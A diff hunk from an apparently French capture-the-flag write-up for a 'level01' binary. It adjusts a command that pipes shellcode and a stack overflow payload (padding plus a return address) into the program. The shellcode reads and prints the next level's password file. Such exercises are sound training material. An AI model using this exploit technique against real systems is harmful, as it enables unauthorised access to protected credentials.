@@ -68,6 +68,6 @@ puts("nope, incorrect password...\n")                                  = 29
 </pre>
 - Il suffit maintenant de lancer la commande
 ```
-$> (python -c "print('dat_wil0' + 'jsh.pashl02/hlevehers/he/ush/hom\x89\xe31\xc91\xd2j\x05X\xcd\x80j\x01[\x89\xc11\xd2h\xff\xff\xff\x7f^1\xc0\xb0\xbb\xcd\x80')"; python -c "print('admin' + 'B' * 75 + '\x48\xa0\x04\x08')") | ./level01
+(python -c "print('dat_wil0' + 'jsh.pashl02/hlevehers/he/ush/hom\x89\xe31\xc91\xd2j\x05X\xcd\x80j\x01[\x89\xc11\xd2h\xff\xff\xff\x7f^1\xc0\xb0\xbb\xcd\x80')"; python -c "print('admin' + 'B' * 75 + '\x48\xa0\x04\x08')") | ./level01
 ```
 
